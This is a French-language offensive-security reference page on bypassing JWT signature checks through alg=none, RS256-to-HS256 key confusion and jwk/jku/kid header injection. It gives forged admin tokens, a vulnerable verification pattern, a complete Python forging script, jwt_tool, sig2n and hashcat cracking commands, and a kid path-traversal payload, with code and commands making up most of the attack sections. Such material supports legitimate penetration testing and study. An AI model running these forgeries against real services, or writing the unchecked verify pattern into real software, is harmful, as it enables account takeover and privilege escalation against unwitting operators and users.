---
title: "Confusion d'algorithme JWT et contournement de signature : alg=none, confusion de clé RS256 vers HS256 et injection d'en-tête"
description: "Comment le code du vérificateur est trompé pour accepter des JSON Web Tokens forgés, via l'algorithme none, la confusion de clé RS256/HS256 et l'abus des en-têtes jwk/jku/kid, avec des payloads concrets."
keywords:
  - JWT
  - JSON Web Token
  - confusion d'algorithme
  - alg none
  - RS256 HS256
  - contournement de signature
  - jwt_tool
---

# Confusion d'algorithme JWT

Un contournement de vérification de signature dans lequel le serveur est amené à accepter un JSON Web Token (JWT) dont l'attaquant contrôle les claims. L'en-tête `alg` du jeton est fourni par l'attaquant ; un vérificateur qui lui fait confiance peut donc être orienté vers un chemin de code qui utilise le mauvais matériel de clé, ou aucun contrôle de signature du tout. L'impact pratique est un **contournement d'authentification et une élévation de privilèges** : forgez `{"sub":"administrator"}` et devenez n'importe quel utilisateur.

## Vue d'ensemble

Un JWT est constitué de trois segments base64url joints par des points, `header.payload.signature`, où la signature couvre `base64url(header) + "." + base64url(payload)` (RFC 7519, RFC 7515). Le paramètre `alg` de l'en-tête déclare comment cette signature a été produite, par exemple `HS256` (HMAC-SHA-256, secret partagé symétrique) ou `RS256` (RSA-SHA-256, paire de clés asymétrique privée/publique).

Cette classe de vulnérabilité existe parce que **le vérificateur lit `alg` dans des données que l'attaquant contrôle** et oriente la vérification en conséquence. La RFC 7519 avertit déjà qu'une application devrait rejeter un JWT à moins que les algorithmes qu'il utilise ne soient acceptables pour l'application ; les bugs ci-dessous sont tous des manquements à imposer cela.

Prérequis à l'exploitation : vous pouvez lire et modifier un jeton auquel l'application fait confiance (généralement un cookie de session ou `Authorization: Bearer`), et le vérificateur gère mal `alg`, la signature, ou un en-tête de sélection de clé (`jwk`, `jku`, `kid`).

## Comment ça marche

### L'algorithme `none` (JWT non sécurisé)

La RFC 7515 définit un *JWS non sécurisé* comme un JWS dont `alg` vaut `none` et dont la valeur de signature est la chaîne vide. Une bibliothèque qui honore `none` saute entièrement la vérification de signature et déclare le jeton valide. L'en-tête est simplement :

```json
{ "alg": "none", "typ": "JWT" }
```

Un jeton admin forgé est l'en-tête et le payload, encodés en base64url, suivis d'un **point final sans rien après** :

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
```

Le point final est requis : le segment de payload doit encore être terminé même si la signature est vide. Les serveurs qui mettent en liste de blocage la chaîne littérale `none` peuvent parfois être contournés avec une casse mixte (`None`, `nOnE`) ou des encodages alternatifs, parce que la comparaison a lieu avant la normalisation.

Un proche parent est le contournement par **signature nulle** : `alg` reste `RS256`, mais le segment de signature est tronqué à une longueur nulle et une erreur de logique provoque le saut de la vérification.

### Confusion de clé RS256 vers HS256

De nombreuses bibliothèques exposent un `verify(token, key)` agnostique à l'algorithme qui décide RSA contre HMAC à partir du `alg` du jeton. Un développeur qui n'émet jamais que des jetons RS256 passe la **clé publique RSA** comme cet unique argument `key`, en supposant que la fonction ne fait que de la vérification asymétrique :

```js
// Vulnerable pattern (Node, jsonwebtoken-style API)
const publicKey = fs.readFileSync("public.pem");
jwt.verify(token, publicKey);          // no `algorithms` allowlist
```

Lorsque l'attaquant change `alg` en `HS256`, la bibliothèque calcule `HMAC-SHA256(message, publicKey)` : elle traite la clé publique comme le secret HMAC. Parce que la clé publique RSA est, par définition, publique, l'attaquant possède déjà la chaîne d'octets exacte que le serveur utilise comme clé HMAC. La forge se réduit à :

```
forgedToken = HS256_sign(attackerPayload, secret = serverRSAPublicKey)
```

## Exploitation

### 1 - Forge alg:none

Décodez le jeton, mettez `alg` à `none`, modifiez le payload et supprimez la signature (gardez le point final). Avec [jwt_tool](https://github.com/ticarpi/jwt_tool) :

```bash
# Tamper interactively, or use the exploit mode for alg:none.
python3 jwt_tool.py <JWT> -X a
```

Les lettres du mode `-X` de jwt_tool ont changé d'une version à l'autre ; confirmez donc avec `python3 jwt_tool.py -h`. Dans les versions actuelles : `-X a` est alg:none, `-X n` est la signature nulle, `-X k` est la confusion de clé, `-X i` est l'injection `jwk`, `-X s` est l'usurpation `jku`.

### 2 - Confusion RS256 vers HS256 (clé publique connue)

**(a) Obtenez la clé publique.** Les endpoints JWKS standard l'exposent :

```
GET /.well-known/jwks.json
GET /jwks.json
GET /.well-known/openid-configuration   →   "jwks_uri": "..."
```

renvoyant un JWK Set :

```json
{ "keys": [ { "kty": "RSA", "e": "AQAB", "kid": "75d0ef47-...", "n": "o-yy1wpYmffg..." } ] }
```

**(b) Formatez-la exactement.** C'est l'étape qui échoue le plus souvent. Les octets que vous signez en HMAC doivent être **identiques octet pour octet** à la clé telle que le serveur la détient en mémoire, généralement une chaîne PEM. Énumérez ces variantes et essayez chacune :

- **PKCS#1 (`-----BEGIN RSA PUBLIC KEY-----`) contre X.509 SubjectPublicKeyInfo (`-----BEGIN PUBLIC KEY-----`)** : chaînes d'octets différentes, HMACs différents. Cette ambiguïté exacte a rendu exploitable une faille de fast-jwt en 2023 : son matcher PEM ne reconnaissait que `-----BEGIN PUBLIC KEY-----`.
- **Saut de ligne final** : les fichiers PEM se terminent généralement par `\n` ; incluez-le et excluez-le.
- **Retour à la ligne** à 64 caractères fait partie des octets signés.
- **Texte PEM contre DER décodé** : signez avec la *chaîne* PEM, pas le DER décodé.

**(c) Forgez**, en utilisant les octets PEM comme secret HMAC. Une implémentation brute évite les bibliothèques modernes qui refusent les clés asymétriques sur les chemins HMAC :

```python
import hashlib, hmac, base64, json

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

pub = open("public.pem", "rb").read()          # exact PEM bytes, incl. trailing \n
header  = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64(json.dumps({"sub": "administrator"},       separators=(",", ":")).encode())
signing_input = header + b"." + payload
sig = b64(hmac.new(pub, signing_input, hashlib.sha256).digest())
print((signing_input + b"." + sig).decode())
```

Ou avec jwt_tool lorsque le vérificateur est permissif :

```bash
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

Dans le JWT Editor de Burp, le flux documenté est : importez le JWK comme clé RSA, exportez en PEM, encodez le PEM en base64, créez une Symmetric Key dont le `k` est ce base64, puis signez avec HS256.

### 3 - Récupérer la clé publique à partir de deux jetons (aucune clé exposée)

Lorsqu'aucun JWKS n'est publié, le module RSA peut être récupéré à partir de deux jetons RS256 capturés. La vérification calcule `s^e mod n = padded_hash`, donc `s^e - padded_hash` est un multiple de `n` ; avec deux jetons, `GCD(s1^e - h1, s2^e - h2)` récupère `n` (en supposant l'exposant standard `e = 65537`). PortSwigger fournit un wrapper :

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

Il affiche une ou plusieurs clés candidates en PEM encodé en base64, à la fois sous forme X.509 et PKCS#1, plus un jeton forgé par candidat. Soumettez la forge de chaque candidat (par exemple dans Burp Repeater) jusqu'à ce que l'une vérifie. L'outil amont est [silentsignal/rsa_sign2n](https://github.com/silentsignal/rsa_sign2n).

## Variantes connexes d'injection d'en-tête

- **`jwk` (clé embarquée).** L'attaquant signe avec sa propre clé privée et embarque la clé publique correspondante dans l'en-tête du jeton. Les vérificateurs vulnérables font confiance à la clé en ligne. jwt_tool `-X i`.
- **`jku` / `x5u` (URL de jeu de clés).** Le vérificateur récupère les clés depuis une URL présente dans l'en-tête ; l'attaquant héberge son propre JWKS. Les serveurs durcis mettent l'hôte en liste d'autorisation, mais des divergences d'analyse d'URL peuvent le contourner. jwt_tool `-X s`.
- **Traversée de chemin via `kid`.** `kid` sélectionne un fichier de clé ; le pointer vers un fichier prévisible permet à l'attaquant de connaître la clé. Payload classique : `{"kid":"../../../../dev/null","alg":"HS256"}`, puis signature HMAC avec la chaîne vide (le contenu de `/dev/null`).
- **Injection SQL via `kid`.** Si les clés sont recherchées dans une base de données par `kid`, cette valeur est un sink d'injection qui peut renvoyer une clé connue de l'attaquant.
- **Secret HMAC faible.** Si l'application utilise légitimement HS256 avec un secret devinable, cassez-le hors ligne : `hashcat -a 0 -m 16500 <jwt> <wordlist>` (le mode 16500 est JWT), ou `jwt_tool <JWT> -C -d wordlist.txt`.

## Outils

- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** : altération, alg:none, confusion de clé, modes d'injection d'en-tête, cassage de secret.
- Extension **Burp Suite, JWT Editor** : forge et import de clé dans le flux.
- **[rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) / `portswigger/sig2n`** : récupération de clé publique à partir de deux jetons.
- **hashcat** (`-m 16500`) : cassage hors ligne du secret HS256.

## Références

- PortSwigger Web Security Academy : [JWT attacks](https://portswigger.net/web-security/jwt) et [Algorithm confusion attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
- RFC 7519 : [JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519) ; RFC 7515 : [JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- Tim McLean : [Critical vulnerabilities in JSON Web Token libraries](https://www.chosenplaintext.ca/2015/03/31/jwt-algorithm-confusion.html) (divulgation originale de 2015)
- Silent Signal : [Abusing JWT public keys without the public key](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/)
